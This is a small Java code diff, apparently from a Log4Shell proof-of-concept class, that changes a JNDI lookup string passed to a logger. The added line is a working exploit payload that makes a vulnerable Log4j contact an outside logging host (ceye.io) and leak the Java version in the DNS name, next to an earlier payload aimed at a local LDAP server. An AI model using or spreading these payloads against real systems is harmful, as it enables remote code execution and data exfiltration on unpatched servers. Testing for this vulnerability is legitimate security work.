@@ -23,6 +23,7 @@ public class Log4j {
 
     public static void main(String[] args) {
         String poc = "${jndi:ldap://127.0.0.1:1389/0iun75}";
+        poc = "${jndi:ldap://${java.version}.72568b.ceye.io}";
         logger.error(poc);
     }
 
